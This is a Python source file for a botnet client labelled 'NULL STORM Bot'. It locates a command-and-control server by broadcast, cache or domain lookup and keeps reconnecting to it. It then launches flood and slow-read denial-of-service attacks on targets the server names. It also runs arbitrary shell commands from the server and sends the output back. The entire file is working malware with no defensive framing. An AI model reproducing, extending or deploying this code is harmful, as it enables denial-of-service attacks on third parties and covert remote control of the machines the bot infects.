import socket
import subprocess
import asyncio
import time
import os
import sys
from attack_modules import ApocalypseFlood, SlowRead
import config


def find_c2_via_broadcast():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(3)
        sock.sendto(config.C2_DISCOVERY_KEY.encode(), ("255.255.255.255", config.C2_DISCOVERY_PORT))
        data, addr = sock.recvfrom(1024)
        if data.decode().strip() == config.C2_DISCOVERY_RESPONSE:
            print(f"[NULL STORM] C2 Found via Broadcast: {addr[0]}")
            sock.close()
            return addr[0]
        sock.close()
    except:
        pass
    return None

def find_c2_via_cache():
    try:
        if os.path.exists(config.CACHE_FILE):
            with open(config.CACHE_FILE, "r") as f:
                ip = f.read().strip()
                if ip:
                    print(f"[NULL STORM] C2 Found via Cache: {ip}")
                    return ip
    except:
        pass
    return None

def save_c2_cache(ip):
    try:
        with open(config.CACHE_FILE, "w") as f:
            f.write(ip)
    except:
        pass

def find_c2_via_domain():
    if config.C2_DOMAIN:
        try:
            ip = socket.gethostbyname(config.C2_DOMAIN)
            print(f"[NULL STORM] C2 Found via Domain ({config.C2_DOMAIN}): {ip}")
            return ip
        except:
            pass
    return None

def find_c2_manual_input():
    print("[NULL STORM] Auto-discovery failed.")
    try:
        ip = input("Enter C2 IP manually (or press Enter to retry auto): ").strip()
        if ip:
            save_c2_cache(ip)
            return ip
    except:
        pass
    return None

def discover_c2():
    print("[NULL STORM] Searching for C2 server...")

    ip = find_c2_via_broadcast()
    if ip:
        save_c2_cache(ip)
        return ip

    ip = find_c2_via_cache()
    if ip:
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(3)
            test_sock.connect((ip, config.C2_PORT))
            test_sock.close()
            return ip
        except:
            print("[NULL STORM] Cached IP no longer valid, removing...")
            try:
                os.remove(config.CACHE_FILE)
            except:
                pass

    ip = find_c2_via_domain()
    if ip:
        save_c2_cache(ip)
        return ip

    ip = find_c2_manual_input()
    if ip:
        return ip

    return None

def connect_c2():
    retry_delay = 5
    max_delay = 60
    
    while True:
        ip = discover_c2()
        if ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                s.connect((ip, config.C2_PORT))
                save_c2_cache(ip)
                retry_delay = 5
                print(f"[NULL STORM] Connected to C2 @ {ip}:{config.C2_PORT}")
                return s
            except Exception as e:
                print(f"[NULL STORM] Failed to connect to {ip}: {e}")
        
        print(f"[NULL STORM] Retrying in {retry_delay} seconds...")
        time.sleep(retry_delay)
        retry_delay = min(retry_delay * 2, max_delay)

async def handle_attack(cmd, loop):
    parts = cmd.split()
    if len(parts) < 3:
        return
    
    try:
        if parts[0] == "APOCALYPSE":
            target = parts[1]
            conc = int(parts[2])
            dur = int(parts[3])
            print(f"[NULL STORM] ApocalypseFlood unleashed on {target} | Concurrency: {conc}")
            attack = ApocalypseFlood(target, conc, dur)
            await attack._start_apocalypse()
            print(f"[NULL STORM] ApocalypseFlood finished.")
            
        elif parts[0] == "SLOWREAD":
            target = parts[1]
            port = int(parts[2])
            conns = int(parts[3])
            dur = int(parts[4])
            print(f"[NULL STORM] SlowRead draining {target}:{port} | Sockets: {conns}")
            attack = SlowRead(target, port, conns, dur)
            await attack._launch()
            print(f"[NULL STORM] SlowRead finished.")
            
    except Exception as e:
        print(f"[NULL STORM] Attack error: {e}")

async def main_loop():
    sock = connect_c2()
    loop = asyncio.get_event_loop()
    attack_task = None
    
    while True:
        try:
            data = await loop.sock_recv(sock, 4096)
            if not data:
                print("[NULL STORM] Connection lost. Reconnecting...")
                try:
                    sock.close()
                except:
                    pass
                sock = connect_c2()
                continue
            
            cmd = data.decode().strip()
            print(f"[NULL STORM] Command received: {cmd}")

            if cmd.startswith("APOCALYPSE") or cmd.startswith("SLOWREAD"):
                if attack_task and not attack_task.done():
                    print("[NULL STORM] Waiting for previous attack to finish...")
                    await attack_task
                
                attack_task = asyncio.create_task(handle_attack(cmd, loop))
                try:
                    sock.send(b"ATTACK_STARTED")
                except:
                    pass
                    
            elif cmd == "PING":
                try:
                    sock.send(b"PONG")
                except:
                    pass
                    
            elif cmd == "STATUS":
                status = "IDLE"
                if attack_task and not attack_task.done():
                    status = "ATTACKING"
                try:
                    sock.send(f"STATUS:{status}".encode())
                except:
                    pass
                    
            elif cmd.startswith("SHELL"):
                try:
                    result = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True, timeout=30)
                    output = result.stdout + result.stderr
                    if output:
                        output_bytes = output.encode()
                        for i in range(0, len(output_bytes), 4000):
                            sock.send(output_bytes[i:i+4000])
                            await asyncio.sleep(0.1)
                    else:
                        sock.send(b"Command executed. No output.")
                except subprocess.TimeoutExpired:
                    sock.send(b"Shell command timed out.")
                except Exception as e:
                    sock.send(f"Shell error: {e}".encode())
                    
        except (ConnectionError, OSError) as e:
            print(f"[NULL STORM] Connection error: {e}")
            try:
                sock.close()
            except:
                pass
            if attack_task and not attack_task.done():
                attack_task.cancel()
            sock = connect_c2()
            
        except Exception as e:
            print(f"[NULL STORM] Unexpected error: {e}")
            await asyncio.sleep(1)

if __name__ == "__main__":
    print("=" * 55)
    print("[NULL STORM] Bot v2.1 - Fixed Event Loop")
    print("[NULL STORM] Auto-discovery mode: ON")
    print("=" * 55)
    
    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        print("\n[NULL STORM] Bot shutting down...")
    except Exception as e:
        print(f"[NULL STORM] Fatal error: {e}")
        time.sleep(5)